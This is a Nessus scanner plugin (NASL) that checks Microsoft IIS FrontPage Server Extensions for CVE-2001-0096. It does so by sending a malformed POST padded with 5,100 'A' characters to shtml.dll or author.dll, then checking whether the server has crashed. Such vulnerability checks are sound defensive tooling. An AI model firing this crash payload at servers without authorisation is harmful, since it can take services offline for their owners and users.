#
# This script was written by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10585);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2001-0096");
 script_bugtraq_id(2144);
 script_xref(name:"OSVDB", value:"482");

 script_name(english:"Microsoft IIS Frontpage Server Extensions (FPSE) Malformed Form DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service" );
 script_set_attribute(attribute:"description", value:
"Microsoft IIS, running Frontpage extensions, is vulnerable to 
a remote denial of service attack usually called the 'malformed
web submission' vulnerability.  An attacker, exploiting this 
vulnerability, will be able to render the service unusable.

If this machine serves a business-critical functionality, 
there could be an impact to the business." );
 script_set_attribute(attribute:"solution", value:
"See http://www.microsoft.com/technet/security/bulletin/MS00-100.mspx" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 
 script_summary(english: "Attempts to crash the Microsoft IIS server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2009 John Lampe");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl",  "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

#
# The script code starts here
#

port = get_http_port(default:80);

if ( ! get_port_state(port) ) exit(0);


sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);
i=0;
if(is_cgi_installed_ka(item:"/_vti_bin/shtml.dll/_vti_rpc", port:port)) {
		i=i+1;
		filename[i]="shtml.dll/_vti_rpc";
}
if(is_cgi_installed_ka(item:"/_vti_bin/_vti_aut/author.dll", port:port)) {
		i=i+1;
		filename[i]="_vti_aut/author.dll";
}
if(i==0)exit(0);
for (j=1; j <= i; j = j+1) {
if(get_port_state(port)) {
	mysoc = http_open_socket(port);
	if(mysoc) {
		   mystring = string ("POST /_vti_bin/",
		                       filename[j] , 
				       " HTTP/1.1\r\n" ,
		                       "Date: Thur, 25 Dec 2000 12:31:00 GMT\r\n" ,
				       "MIME-Version: 1.0\r\n" , 
				       "User-Agent: MSFrontPage/4.0\r\n" ,
				       "Host: %25NESSUS%25\r\n" ,
				       "Accept: auth/sicily\r\n",
				       "Content-Length: 5058\r\n",
				       "Content-Type: application/x-www-form-urlencoded\r\n",
				       "X-Vermeer-Content-Type: application/x-www-form-urlencoded\r\n",
				       "Connection: Keep-Alive\r\n\r\n");
		   send(socket:mysoc, data:mystring);
		   incoming = http_recv(socket:mysoc);
		   find_ms = egrep(pattern:"^Server.*IIS.*", string:incoming);
		   if(find_ms) {
				   mystring2 = string("\r\n\r\n" , "method=open+", crap (length:5100 , data:"A"), "\r\n\r\n" );
				   send(socket:mysoc, data:mystring2);
				   close(mysoc);
			} else {
				   close(mysoc);
				   exit(0);
			}
		   mysoc = http_open_socket(port);
		   mystring = http_get(item:"/", port:port);
		   send(socket:mysoc, data:mystring);
		   http_close_socket(mysoc);
		   mysoc = http_open_socket(port);
		   send(socket:mysoc, data:mystring);
		   incoming = recv_line(socket:mysoc, length:1024);
		   http_close_socket(mysoc);
		   find_200 = egrep(pattern:".*200 *OK*", string:incoming);
		   if (!find_200) {
                           security_hole(port);
                           exit(0);
		   }  
     }
  }
}

